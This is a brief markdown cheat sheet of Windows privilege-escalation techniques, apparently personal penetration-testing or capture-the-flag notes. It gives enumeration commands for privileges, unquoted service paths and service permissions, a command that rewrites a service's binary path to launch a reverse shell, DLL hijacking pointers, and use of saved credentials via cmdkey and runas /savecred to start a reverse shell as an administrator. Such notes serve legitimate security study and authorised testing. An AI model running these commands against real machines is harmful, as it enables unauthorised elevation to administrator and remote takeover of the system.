# Check Privileges

`whoami /priv`

# Unquoted Service Paths

`wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """`

# Insecure Service Permissions

*need to find a better way to check for this, but what you want to know is if you have SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS* 

Will show you the configuration of a service.
`sc qc <service>`

Will show you the status of a service
`sc query <service>`

If you do have access to modify a service you can change what it executes
`sc config binpath=<full path of revshell> <service you have change config perm on>`

# DLL Hijacking

*You may need rdp access to run procmon on windows pc to see what DLLs an application is using*

Usually WinPeas will show you if you can write to a path of a non windows service. Then you can use procmon to find hijackable DLL queries.

# CMDKey

This will list the creds windows saves automatically.
`cmdkey /list`
Then use the runas command to use the saved cred.
`runas /savecred /user:<adminuser>  <path to rev shell>`
